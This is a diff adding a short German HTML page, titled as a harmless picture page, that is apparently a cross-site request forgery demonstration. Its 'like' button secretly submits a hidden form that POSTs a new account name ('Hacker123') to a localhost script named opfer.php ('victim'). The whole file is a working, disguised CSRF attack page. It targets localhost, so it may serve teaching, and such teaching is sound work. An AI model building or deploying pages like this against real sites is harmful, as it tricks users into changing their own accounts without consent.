@@ -1,0 +1,17 @@
+<h2>Harmlose Bilder-Seite</h2>
+<img src="https://picsum.photos/500" alt="Katze">
+
+<p>
+    <b>Gefällt Ihnen dieses Bild?</b><br />
+    <button type="button" id="like-btn">Oh ja!</button>
+</p>
+
+<form action="http://localhost/opfer.php" method="POST" id="attack">
+    <input type="hidden" name="newname" value="Hacker123">
+</form>
+
+<script>
+    document.getElementById("like-btn").addEventListener("click", () => {
+        document.getElementById("attack").submit();
+    });
+</script>
